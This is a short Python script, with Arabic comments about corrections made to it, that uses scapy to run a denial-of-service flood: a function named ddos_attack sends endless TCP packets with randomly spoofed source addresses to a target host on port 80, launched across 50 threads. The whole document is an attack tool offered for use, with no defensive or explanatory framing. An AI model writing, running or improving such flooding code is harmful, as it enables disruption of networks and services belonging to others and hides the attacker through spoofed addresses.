from scapy.all import *
import random
import threading # تم إضافة الاستيراد هنا

def ddos_attack(target_ip, target_port):
    while True:
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # استخدام sendp للتعامل مع طبقة الـ Ethernet
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=target_ip) / TCP(dport=target_port) / "Hello, World!"
        sendp(packet, verbose=False) # تم تغييرها إلى sendp

# استخدام السكربت
target_ip = "192.168.1.25"
target_port = 80
for _ in range(50):
    # تم تصحيح اسم الدالة هنا لتطابق ddos_attack
    t = threading.Thread(target=ddos_attack, args=(target_ip, target_port))
    t.start()
